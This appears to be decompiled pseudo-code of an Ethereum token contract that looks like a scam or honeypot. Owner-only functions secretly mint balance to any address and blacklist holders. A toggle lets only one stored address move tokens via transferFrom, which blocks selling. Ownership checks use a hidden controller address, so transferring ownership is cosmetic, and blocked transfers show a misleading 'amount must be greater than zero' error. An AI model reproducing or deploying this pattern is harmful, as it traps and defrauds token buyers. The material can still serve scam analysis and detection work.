contract main {




// =====================  Runtime code  =====================


address owner;
address stor1;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor4;
mapping of uint8 stor5;
uint256 totalSupply;
uint256 totalFees;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address stor10;
address deadAddress; offset 8
address devAddress;
uint256 sub_a14c80fb;
uint256 devFee;
mapping of uint8 stor14;
uint8 stor15;
uint8 stor15; offset 8
uint256 stor15; offset 8
uint256 sub_b37bbf84;
mapping of uint256 stor17;
array of address stor18;
address stor19;

function name() payable {
    return name[0 len name.length]
}

function isExcludedFromRewards(address arg1) payable {
    require calldata.size - 4 >= 32
    return bool(stor5[address(arg1)])
}

function totalFees() payable {
    return totalFees
}

function totalSupply() payable {
    return totalSupply
}

function deadAddress() payable {
    return deadAddress
}

function decimals() payable {
    return decimals
}

function devAddress() payable {
    return devAddress
}

function sub_55076c37(?) payable {
    require calldata.size - 4 >= 32
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    return bool(stor14[address(arg1)])
}

function devFee() payable {
    return devFee
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function sub_a14c80fb(?) payable {
    return sub_a14c80fb
}

function sub_b37bbf84(?) payable {
    return sub_b37bbf84
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function sub_db84d01e(?) payable {
    require calldata.size - 4 >= 32
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor14[address(arg1)] = 1
}

function sub_ef313897(?) payable {
    require calldata.size - 4 >= 32
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor14[address(arg1)] = 0
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    owner = arg1
}

function includeInFee(address arg1) payable {
    require calldata.size - 4 >= 32
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor4[address(arg1)] = 0
}

function excludeFromFee(address arg1) payable {
    require calldata.size - 4 >= 32
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor4[address(arg1)] = 1
}

function sub_6e39b666(?) payable {
    require calldata.size - 4 >= 32
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(248, 0, stor15.field_8) = Mask(248, 0, arg1)
}

function sub_3bd1c6f2(?) payable {
    require calldata.size - 4 >= 64
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if arg2 <= 0:
        revert with 0, 'mhsch'
    if not stor17[address(arg1)]:
        stor18.length++
        stor18[stor18.length] = arg1
    if stor17[address(arg1)] + arg2 < stor17[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    stor17[address(arg1)] += arg2
    if sub_b37bbf84 + arg2 < sub_b37bbf84:
        revert with 0, 'SafeMath: addition overflow'
    sub_b37bbf84 += arg2
    if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] += arg2
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if stor4[address(msg.sender)]:
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        37,
                        0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                        mem[201 len 27]
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        35,
                        0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                        mem[199 len 29]
        if arg2 <= 0:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        41,
                        0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                        mem[205 len 23]
        if uint8(stor15.field_0):
            if stor14[address(msg.sender)]:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            41,
                            0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                            mem[205 len 23]
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        37,
                        0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                        mem[201 len 27]
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        35,
                        0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                        mem[199 len 29]
        if arg2 > balanceOf[address(msg.sender)]:
            revert with 0, 'SafeMath: subtraction overflow'
        balanceOf[address(msg.sender)] -= arg2
        if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg1)] += arg2
        emit Transfer(arg2, msg.sender, arg1);
    else:
        if stor4[address(arg1)]:
            if not msg.sender:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            37,
                            0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                            mem[201 len 27]
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            35,
                            0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                            mem[199 len 29]
            if arg2 <= 0:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            41,
                            0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                            mem[205 len 23]
            if uint8(stor15.field_0):
                if stor14[address(msg.sender)]:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                41,
                                0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                                mem[205 len 23]
            if not msg.sender:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            37,
                            0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                            mem[201 len 27]
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            35,
                            0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                            mem[199 len 29]
            if arg2 > balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(msg.sender)] -= arg2
            if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] += arg2
            emit Transfer(arg2, msg.sender, arg1);
        else:
            if not arg2:
                if arg2:
                    require arg2
                    if arg2 * sub_a14c80fb / arg2 != sub_a14c80fb:
                        revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[261 len 31]
                if not msg.sender:
                    revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
                if not devAddress:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
            require arg2
            if arg2 * devFee / arg2 != devFee:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if not arg2:
                if not msg.sender:
                    revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
                if not devAddress:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
                if arg2 * devFee / 100 <= 0:
                    revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
                if uint8(stor15.field_0):
                    if stor14[address(msg.sender)]:
                        revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
                if not msg.sender:
                    revert with 0, 32, 37, 0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
                if not devAddress:
                    revert with 0, 32, 35, 0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
                if arg2 * devFee / 100 > balanceOf[address(msg.sender)]:
                    revert with 0, 'SafeMath: subtraction overflow'
                balanceOf[address(msg.sender)] -= arg2 * devFee / 100
                if balanceOf[stor11] + (arg2 * devFee / 100) < balanceOf[stor11]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor11] += arg2 * devFee / 100
                emit Transfer((arg2 * devFee / 100), msg.sender, devAddress);
                if not msg.sender:
                    revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[393 len 27]
                if not deadAddress:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[391 len 29]
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[397 len 23]
            require arg2
            if arg2 * sub_a14c80fb / arg2 != sub_a14c80fb:
                revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[261 len 31]
            if not msg.sender:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
            if not devAddress:
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
            if arg2 * devFee / 100 <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
            if uint8(stor15.field_0):
                if stor14[address(msg.sender)]:
                    revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
            if not msg.sender:
                revert with 0, 32, 37, 0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
            if not devAddress:
                revert with 0, 32, 35, 0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
            if arg2 * devFee / 100 > balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(msg.sender)] -= arg2 * devFee / 100
            if balanceOf[stor11] + (arg2 * devFee / 100) < balanceOf[stor11]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor11] += arg2 * devFee / 100
            emit Transfer((arg2 * devFee / 100), msg.sender, devAddress);
            if not msg.sender:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[393 len 27]
            if not deadAddress:
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[391 len 29]
            if arg2 * sub_a14c80fb / 100 <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[397 len 23]
            if uint8(stor15.field_0):
                if stor14[address(msg.sender)]:
                    revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[397 len 23]
            if not msg.sender:
                revert with 0, 32, 37, 0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[393 len 27]
            if not deadAddress:
                revert with 0, 32, 35, 0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[391 len 29]
            if arg2 * sub_a14c80fb / 100 > balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(msg.sender)] -= arg2 * sub_a14c80fb / 100
            if balanceOf[stor10] + (arg2 * sub_a14c80fb / 100) < balanceOf[stor10]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor10] += arg2 * sub_a14c80fb / 100
            emit Transfer((arg2 * sub_a14c80fb / 100), msg.sender, deadAddress);
            if arg2 * devFee / 100 > arg2:
                revert with 0, 'SafeMath: subtraction overflow'
            if arg2 * sub_a14c80fb / 100 > arg2 - (arg2 * devFee / 100):
                revert with 0, 'SafeMath: subtraction overflow'
            if not msg.sender:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[585 len 27]
            if not arg1:
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[583 len 29]
            if arg2 - (arg2 * devFee / 100) - (arg2 * sub_a14c80fb / 100) <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[589 len 23]
            if uint8(stor15.field_0):
                if stor14[address(msg.sender)]:
                    revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[589 len 23]
            if not msg.sender:
                revert with 0, 32, 37, 0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[585 len 27]
            if not arg1:
                revert with 0, 32, 35, 0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[583 len 29]
            if arg2 - (arg2 * devFee / 100) - (arg2 * sub_a14c80fb / 100) > balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * devFee / 100) + (arg2 * sub_a14c80fb / 100)
            if balanceOf[address(arg1)] + arg2 - (arg2 * devFee / 100) - (arg2 * sub_a14c80fb / 100) < balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * devFee / 100) - (arg2 * sub_a14c80fb / 100)
            emit Transfer((arg2 - (arg2 * devFee / 100) - (arg2 * sub_a14c80fb / 100)), msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if uint8(stor15.field_8):
        if stor19 != arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        41,
                        0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                        mem[205 len 23]
    if stor4[address(msg.sender)]:
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        37,
                        0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                        mem[201 len 27]
        if not arg2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        35,
                        0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                        mem[199 len 29]
        if arg3 <= 0:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        41,
                        0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                        mem[205 len 23]
        if uint8(stor15.field_0):
            if stor14[address(arg1)]:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            41,
                            0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                            mem[205 len 23]
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        37,
                        0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                        mem[201 len 27]
        if not arg2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        35,
                        0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                        mem[199 len 29]
        if arg3 > balanceOf[address(arg1)]:
            revert with 0, 'SafeMath: subtraction overflow'
        balanceOf[address(arg1)] -= arg3
        if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg2)] += arg3
        emit Transfer(arg3, arg1, arg2);
    else:
        if stor4[address(arg2)]:
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            37,
                            0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                            mem[201 len 27]
            if not arg2:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            35,
                            0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                            mem[199 len 29]
            if arg3 <= 0:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            41,
                            0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                            mem[205 len 23]
            if uint8(stor15.field_0):
                if stor14[address(arg1)]:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                41,
                                0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                                mem[205 len 23]
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            37,
                            0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                            mem[201 len 27]
            if not arg2:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            35,
                            0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                            mem[199 len 29]
            if arg3 > balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(arg1)] -= arg3
            if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] += arg3
            emit Transfer(arg3, arg1, arg2);
        else:
            if not arg3:
                if arg3:
                    require arg3
                    if arg3 * sub_a14c80fb / arg3 != sub_a14c80fb:
                        revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[261 len 31]
                if not arg1:
                    revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
                if not devAddress:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
            require arg3
            if arg3 * devFee / arg3 != devFee:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if not arg3:
                if not arg1:
                    revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
                if not devAddress:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
                if arg3 * devFee / 100 <= 0:
                    revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
                if uint8(stor15.field_0):
                    if stor14[address(arg1)]:
                        revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
                if not arg1:
                    revert with 0, 32, 37, 0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
                if not devAddress:
                    revert with 0, 32, 35, 0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
                if arg3 * devFee / 100 > balanceOf[address(arg1)]:
                    revert with 0, 'SafeMath: subtraction overflow'
                balanceOf[address(arg1)] -= arg3 * devFee / 100
                if balanceOf[stor11] + (arg3 * devFee / 100) < balanceOf[stor11]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor11] += arg3 * devFee / 100
                emit Transfer((arg3 * devFee / 100), arg1, devAddress);
                if not arg1:
                    revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[393 len 27]
                if not deadAddress:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[391 len 29]
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[397 len 23]
            require arg3
            if arg3 * sub_a14c80fb / arg3 != sub_a14c80fb:
                revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[261 len 31]
            if not arg1:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
            if not devAddress:
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
            if arg3 * devFee / 100 <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
            if uint8(stor15.field_0):
                if stor14[address(arg1)]:
                    revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
            if not arg1:
                revert with 0, 32, 37, 0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
            if not devAddress:
                revert with 0, 32, 35, 0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
            if arg3 * devFee / 100 > balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(arg1)] -= arg3 * devFee / 100
            if balanceOf[stor11] + (arg3 * devFee / 100) < balanceOf[stor11]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor11] += arg3 * devFee / 100
            emit Transfer((arg3 * devFee / 100), arg1, devAddress);
            if not arg1:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[393 len 27]
            if not deadAddress:
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[391 len 29]
            if arg3 * sub_a14c80fb / 100 <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[397 len 23]
            if uint8(stor15.field_0):
                if stor14[address(arg1)]:
                    revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[397 len 23]
            if not arg1:
                revert with 0, 32, 37, 0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[393 len 27]
            if not deadAddress:
                revert with 0, 32, 35, 0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[391 len 29]
            if arg3 * sub_a14c80fb / 100 > balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(arg1)] -= arg3 * sub_a14c80fb / 100
            if balanceOf[stor10] + (arg3 * sub_a14c80fb / 100) < balanceOf[stor10]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor10] += arg3 * sub_a14c80fb / 100
            emit Transfer((arg3 * sub_a14c80fb / 100), arg1, deadAddress);
            if arg3 * devFee / 100 > arg3:
                revert with 0, 'SafeMath: subtraction overflow'
            if arg3 * sub_a14c80fb / 100 > arg3 - (arg3 * devFee / 100):
                revert with 0, 'SafeMath: subtraction overflow'
            if not arg1:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[585 len 27]
            if not arg2:
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[583 len 29]
            if arg3 - (arg3 * devFee / 100) - (arg3 * sub_a14c80fb / 100) <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[589 len 23]
            if uint8(stor15.field_0):
                if stor14[address(arg1)]:
                    revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[589 len 23]
            if not arg1:
                revert with 0, 32, 37, 0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[585 len 27]
            if not arg2:
                revert with 0, 32, 35, 0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[583 len 29]
            if arg3 - (arg3 * devFee / 100) - (arg3 * sub_a14c80fb / 100) > balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * devFee / 100) + (arg3 * sub_a14c80fb / 100)
            if balanceOf[address(arg2)] + arg3 - (arg3 * devFee / 100) - (arg3 * sub_a14c80fb / 100) < balanceOf[address(arg2)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * devFee / 100) - (arg3 * sub_a14c80fb / 100)
            emit Transfer((arg3 - (arg3 * devFee / 100) - (arg3 * sub_a14c80fb / 100)), arg1, arg2);
            if arg3 > allowance[address(arg1)][address(msg.sender)]:
                revert with 0, 
                            32,
                            40,
                            0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                            mem[616 len 24],
                            mem[664 len 8]
            if not arg1:
                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[744 len 28]
            if not msg.sender:
                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[742 len 30]
            allowance[address(arg1)][address(msg.sender)] -= arg3
            emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
